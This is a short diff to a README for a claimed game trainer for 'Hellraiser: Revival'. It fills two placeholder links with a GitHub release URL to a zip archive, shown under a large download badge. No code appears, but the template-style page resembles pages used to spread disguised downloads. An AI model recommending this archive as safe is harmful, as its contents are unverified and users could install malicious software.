@@ -4,7 +4,7 @@
 
 **36-module feature toolkit for Clive Barker's Hellraiser: Revival**
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/Chaosphipartition/cbh-revival-overlay/releases/download/v1.0.0/HellraiserRevival_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/DOWNLOAD-hellraiser--revival--trainer_v1.0-28a745?style=for-the-badge&logo=github&logoColor=white" height="52"/>
 </a>
 
@@ -145,7 +145,7 @@ Game:    Clive Barker's Hellraiser: Revival (latest Steam version)
 
 <div align="center">
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/Chaosphipartition/cbh-revival-overlay/releases/download/v1.0.0/HellraiserRevival_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/DOWNLOAD-hellraiser--revival--trainer_v1.0-28a745?style=for-the-badge&logo=github&logoColor=white" height="52"/>
 </a>
 
